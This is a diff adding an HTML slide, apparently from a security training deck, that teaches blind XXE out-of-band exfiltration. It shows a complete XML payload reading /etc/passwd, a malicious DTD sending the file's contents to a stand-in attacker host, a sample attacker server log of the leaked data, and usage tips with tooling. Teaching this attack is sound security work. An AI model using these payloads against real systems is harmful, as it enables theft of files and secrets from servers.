@@ -1,0 +1,40 @@
+<section>
+  <h2 class="section-title">Blind XXE &mdash; out-of-band exfiltration</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">payload.xml &mdash; sent to target</div>
+        <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM
+    "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM
+    "http://attacker.tld/evil.dtd"&gt;
+  %dtd;
+  %send;
+]&gt;
+&lt;foo/&gt;</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header">evil.dtd &mdash; hosted on attacker server</div>
+        <pre><code class="language-xml">&lt;!ENTITY % all
+  "&lt;!ENTITY &#37; send SYSTEM
+   'http://attacker.tld/?d=&#37;file;'&gt;"&gt;
+%all;</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-blue">
+        <div class="card-header">$ python3 -m http.server 80 (attacker)</div>
+        <pre><code class="language-text">target.victim - - "GET /evil.dtd HTTP/1.1" 200
+target.victim - - "GET /?d=root:x:0:0:root...
+                              HTTP/1.1" 200</code></pre>
+      </div>
+      <div class="textbox" style="margin-top: 12px;">
+        <p><span class="inline-tag tag-red">When to use</span> The endpoint accepts XML but doesn't echo any field back. No reflection, no error message that quotes the value.</p>
+        <p><span class="inline-tag tag-purple">How</span> <code>%file;</code> reads the secret. <code>%all;</code> defines a new entity whose URL contains the secret. The parser fetches that URL &mdash; you log the request.</p>
+        <p><span class="inline-tag tag-cyan">Tools</span> <code>interactsh</code>, <code>burp collaborator</code>, or just <code>python3 -m http.server</code> on a public IP.</p>
+      </div>
+    </div>
+  </div>
+</section>
